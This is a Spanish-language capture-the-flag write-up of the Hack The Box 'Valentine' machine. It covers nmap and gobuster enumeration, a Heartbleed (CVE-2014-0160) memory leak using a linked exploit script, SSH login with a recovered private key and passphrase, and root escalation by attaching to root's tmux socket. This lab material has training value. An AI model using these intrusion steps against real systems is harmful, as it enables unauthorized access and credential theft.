---
title: "Valentine - WriteUp"
date: Mon Jun 09 2025 14:00:00 GMT+0200 (Central European Summer Time)
categories: [WriteUps, HTB, Linux]
tags: [ctf, nmap, htb, dirb, cve, exploit, cve-2014-0160, apache, gobuster, linux]
image: /assets/img/htb-writeups/Pasted image 20240201101609.png
---

{% include machine-info.html
  machine="Valentine"
  os="Linux"
  difficulty="Easy"
  platform="HTB"
%}

![Valentine](/assets/img/htb-writeups/Pasted image 20240201101609.png)

---

---
-----

![VALENTINE](/assets/img/htb-writeups/Pasted image 20240201101609.png)

-----

#### ENUMERACIÓN

NMAP

```bash
# Nmap 7.94SVN scan initiated Thu Feb  1 10:18:23 2024 as: nmap -sCV -p 22,80,443 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-boots
trap.xsl -oN targeted -oX targetedXML 10.129.1.181
Nmap scan report for 10.129.1.181
Host is up (0.044s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2024-02-01T09:18:38+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
```

Damos de alta el nombre de dominio _valentine.htb_ en el archivo hosts.

![VALENTINE](/assets/img/htb-writeups/Pasted image 20240201104323.png)

Vemos que la versión del OpenSSH es muy inferior a la 7.7 por lo que podemos enumerar usuarios y al ver el nombre de la máquina podemos estar ante un host vulnerable a _Heartbleed_. 

Vamos a pasar un script de NMAP para confirmar si es vulnerable:

```bash
$ nmap --script=ssl-heartbleed -p 443 10.129.1.181
```

Y efectivamente, es vulnerable.

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-01 10:24 CET
Nmap scan report for valentine.htb (10.129.1.181)
Host is up (0.044s latency).

PORT    STATE SERVICE
443/tcp open  https
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: 'VULNERABLE'
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://cvedetails.com/cve/2014-0160/
|_      http://www.openssl.org/news/secadv_20140407.txt 
```

La vulnerabilidad tiene el CVE-2014-0160

FUZZING

```bash
$ gobuster dir -u http://10.129.1.181 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 --no-error
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.1.181
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 38]
/dev                  (Status: 301) [Size: 310] [--> http://10.129.1.181/dev/]
/encode               (Status: 200) [Size: 554]
/decode               (Status: 200) [Size: 552]
/omg                  (Status: 200) [Size: 153356]
/server-status        (Status: 403) [Size: 293]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

Miramos las rutas encontradas:

![VALENTINE](/assets/img/htb-writeups/Pasted image 20240201104135.png)

![VALENTINE](/assets/img/htb-writeups/Pasted image 20240201104436.png)

![VALENTINE](/assets/img/htb-writeups/Pasted image 20240201104523.png)

![VALENTINE](/assets/img/htb-writeups/Pasted image 20240201104151.png)

![VALENTINE](/assets/img/htb-writeups/Pasted image 20240201104212.png)

#### EXPLOTACIÓN

Vamos a centrarnos en el archivo _hype_key_ encontrado. Parece Hexadecimal. Nos ayudaremos de la página _Cyberchef_ para intentar averiguar lo que oculta o cuál es su función...

![VALENTINE](/assets/img/htb-writeups/Pasted image 20240201104909.png)

Es una clave privada.

Nos la descargamos:
```bash
$ wget http://10.129.1.181/dev/hype_key
```

La convertimos a ASCII y le damos los permisos necesarios:
```bash
$ xxd -r -p hype_key id_rsa
$ chmod 600 id_rsa
```

Vamos a ejecutar el exploit https://gist.github.com/eelsivart/10174134 para ver qué encontramos.

```bash
$ python2.7 heartbleed.py 10.129.1.181
```

![VALENTINE](/assets/img/htb-writeups/Pasted image 20240201110555.png)

Nos devuelve una variable _text_ con un texto cifrado en _base64_. Lo desciframos y lo apuntamos.

```bash
echo -n "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d; echo
heartbleedbelievethehype
```

Si vamos a las páginas encontradas enconder / decoder hacen la misma función. Codifican en base64 y viceversa.

![VALENTINE](/assets/img/htb-writeups/Pasted image 20240201111521.png)

Probamos unos cuantos usuarios aprovechándonos de la vulnerabailidad de enumeración, funciona aunque la respuesta la ofrece con varios segundos de retraso lo que imposibilita la enumeración rápida por diccionario. Pero damos con un usuario válido...

![VALENTINE](/assets/img/htb-writeups/Pasted image 20240201111822.png)

Perfecto, parece que tenemos un usuario, una contraseña y un archivo de clave privada... Vamos a probar todo junto y ver si podemos obtener un acceso a la máquina...

```bash
$ ssh -i id_rsa hype@10.129.1.181
```

Si en este punto diera un error al conectar del tipo "_sign_and_send_pubkey: no mutual signature supported_" podremos conectar sin problemas añadiendo un argumento al comando anterior:

```bash
$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i id_rsa hype@10.129.1.181
```

#### ESCALADA

Si examinamos los procesos vemos uno que nos llama la atención:

```bash
root       1249  0.0  0.1  26416  1676 ?        Ss   01:15   0:01 /usr/bin/tmux -S /.devs/dev_sess
```

El usuario root está ejecutando _tmux_, que es una terminal.
Si consultamos _gtfobins_ vemos que podemos ejecutarlo como el usuario del servicio al que ataca.

https://gtfobins.github.io/gtfobins/tmux/#shell

En este caso bastará con ejecutar el mismo comando que está ejecutando root para escalar privilegios.

```bash
$ /usr/bin/tmux -S /.devs/dev_sess
```

![VALENTINE](/assets/img/htb-writeups/Pasted image 20240201120535.png)
---

**Última actualización**: 2025-06-09<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
